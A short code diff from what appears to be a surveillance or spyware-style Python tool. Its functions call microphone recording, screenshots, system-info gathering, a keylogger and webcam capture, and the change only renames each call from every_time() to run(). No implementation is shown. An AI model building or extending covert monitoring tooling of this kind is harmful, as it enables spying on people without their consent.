@@ -12,14 +12,14 @@ from src.make_dir import run
 
 def microphone():
     m = Microphone()
-    m.every_time()
+    m.run()
 
 def mkdir():
     run()
 
 def screenshot():
     screen = Screenshots()
-    screen.every_time()
+    screen.run()
 
 def system_info():
     sysf = SysInfo()
@@ -31,7 +31,7 @@ def keylogger():
 
 def web_camera():
     w = WebCamera()
-    w.every_time()
+    w.run()
 
 
 if __name__ == "__main__":
